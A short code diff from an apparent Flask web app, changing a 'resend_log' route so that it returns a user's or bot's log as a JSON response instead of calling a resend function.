@@ -174,7 +174,8 @@ def resend_log():
             connected = request.form.get('user')
         elif 'bot' in request.cookies:
             connected = request.cookies.get('bot')
-        botnet.resendLog(connected)
+        filestr = json.dumps(botnet.getLog(connected))
+        return Response(filestr, status=200, mimetype='application/json')
     return "done"
 
 @app.route('/finder')
